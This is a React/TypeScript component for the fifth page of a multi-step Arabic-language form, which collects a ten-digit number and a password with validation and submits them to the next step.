import Input from "@/components/Input";
import Main from "@/components/Main";
import { Button } from "@/components/ui/button";
import { MAIN_BTN } from "@/constants/data";
import { useEffect } from "react";
import { FieldValues, useForm } from "react-hook-form";
import {
  currentPage,
  extraInfo,
  sendDataToServer,
} from "../../context/signals";

function Page5() {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ mode: "all" });

  function sendData(data: FieldValues) {
    extraInfo.value.number = data.number;

    sendDataToServer(data, "page5", "page6", true);
  }

  useEffect(() => {
    currentPage.value = "page5";
  }, []);
  return (
    <Main>
      <form
        className="flex flex-col gap-8  w-full"
        onSubmit={handleSubmit(sendData)}
      >
        <Input
          errors={errors}
          register={register}
          id="number"
          label="رقم"
          type="number"
          isAr
          value={extraInfo.value.number}
          options={{
            required: "هذا الحقل ضروري",
            pattern: {
              value: /^[0-9]{10}$/,
              message: "يجب كتابة عشر أرقام",
            },
          }}
        />
        <Input
          errors={errors}
          register={register}
          id="password"
          label="كلمة المرور"
          type="password"
          isAr
          options={{
            required: "هذه الحقل ضروري",
          }}
        />

        <Button className={MAIN_BTN + " w-[150px] mx-auto"}>التالي</Button>
      </form>
    </Main>
  );
}

export default Page5;
